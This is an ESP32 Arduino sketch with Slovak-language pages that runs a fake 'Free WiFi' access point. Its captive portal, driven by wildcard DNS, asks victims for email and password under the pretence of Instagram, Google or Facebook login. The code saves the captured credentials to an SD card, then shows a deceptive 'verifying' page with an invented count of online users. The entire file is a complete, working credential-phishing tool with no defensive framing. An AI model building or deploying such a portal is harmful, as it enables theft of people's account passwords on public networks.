#include <WiFi.h>                   
#include <DNSServer.h>
#include <WebServer.h>              
#include <SD.h>                     
#include <SPI.h>                    

#define SD_CS_PIN 5  

#define SSID_NAME "Free WiFi"
#define SUBTITLE "Free WiFi service."
#define TITLE "Prihlásenie"
#define BODY "Je možné prihlásiť sa napríklad cez Instagram, Google, Facebook pre internetové pripojenie.<br>Ak sa nedokážete pripojiť, skuste to znovu a skontrolujte Email alebo heslo."
#define POST_TITLE "Overuje sa..."
#define POST_BODY "Vaše prihlásenie je v procese. Prosím, počkajte 1 minútu pre pripojenie.<br>Ďakujeme za trpezlivosť.<br>Pripojení ONLINE používatelia: 26<br>Stav: Zatiaľ ste OFFLINE<br>Ak sa nedokážete pripojiť, skontrolujte vaše prihlasovacie údaje."
#define PASS_TITLE "Credentials"
#define CLEAR_TITLE "Cleared"

const byte HTTP_CODE = 200;
const byte DNS_PORT = 53;
IPAddress APIP(172, 0, 0, 1);  

DNSServer dnsServer;
WebServer webServer(80);

// Uloženie údajov na SD kartu
void saveCredentialsToSD(String email, String password) {
  File dataFile = SD.open("/htmldata.txt", FILE_APPEND);
  if (dataFile) {
    dataFile.println("Nové údaje:");
    dataFile.print("Email: ");
    dataFile.println(email);
    dataFile.print("Heslo: ");
    dataFile.println(password);
    dataFile.println("--------------------");
    dataFile.close();
    Serial.println("Data uložené do SD karty");
  } else {
    Serial.println("Chyba pri otváraní súboru.");
  }
}

// Funkcia na spracovanie vstupu - ponecháva diakritiku
String input(String argName) {
  String a = webServer.arg(argName);
  a.replace("<", "&lt;");
  a.replace(">", "&gt;");
  if (a.length() > 200) {
    a = a.substring(0, 200);
  }
  return a;
}

// Vytvorenie HTML hlavičky so správnym UTF-8 kódovaním
String header(String t) {
  String a = String(SSID_NAME);
  String CSS = "article { background: #f2f2f2; padding: 1.3em; }"
               "body { color: #333; font-family: Century Gothic, sans-serif; font-size: 18px; line-height: 24px; margin: 0; padding: 0; }"
               "div { padding: 0.5em; }"
               "h1 { margin: 0.5em 0 0 0; padding: 0.5em; }"
               "input { width: 100%; padding: 9px 10px; margin: 8px 0; box-sizing: border-box; border-radius: 0; border: 1px solid #555555; }"
               "label { color: #333; display: block; font-style: italic; font-weight: bold; }"
               "nav { background: #0066ff; color: #fff; display: block; font-size: 1.3em; padding: 1em; }"
               "nav b { display: block; font-size: 1.5em; margin-bottom: 0.5em; } "
               "textarea { width: 100%; }";
  String h = "<!DOCTYPE html><html lang=\"sk\">"
             "<head><meta charset=\"UTF-8\">"
             "<meta name=viewport content=\"width=device-width,initial-scale=1\">"
             "<title>"+a+" :: "+t+"</title>"
             "<style>"+CSS+"</style></head>"
             "<body><nav><b>"+a+"</b> "+SUBTITLE+"</nav><div><h1>"+t+"</h1></div><div>";
  return h; 
}

// Spracovanie POST požiadavky
String posted() {
  String email = input("email");
  String password = input("password");

  saveCredentialsToSD(email, password);

  return header(POST_TITLE) + POST_BODY + "</div><div><p>Email: <b>" + email + "</b></p><p>Heslo: <b>" + password + "</b></p></div></body></html>";
}

void setup() {
  Serial.begin(115200);

  if (!SD.begin(SD_CS_PIN)) {
    Serial.println("Chyba pri otváraní SD karty!");
    return;
  }
  Serial.println("SD karta inicializovaná.");

  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(APIP, APIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(SSID_NAME);

  dnsServer.start(DNS_PORT, "*", APIP);

  webServer.on("/post", []() {
    webServer.send(HTTP_CODE, "text/html; charset=UTF-8", posted());
  });

  webServer.onNotFound([]() {
    String formHTML = header(TITLE) +
      "<form action='/post' method='post'>"
      "<label for='email'>Email (alebo prihlásiť sa cez Instagram, Google, Facebook):</label>"
      "<input type='text' id='email' name='email' autocomplete='off' required><br>"
      "<label for='password'>Heslo:</label>"
      "<input type='password' id='password' name='password' autocomplete='off' required><br>"
      "<input type='submit' value='Prihlásiť sa'>"
      "</form></div></body></html>";
    webServer.send(HTTP_CODE, "text/html; charset=UTF-8", formHTML);
  });

  webServer.begin();
  Serial.println("HTTP server spustený...");
}

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();
}
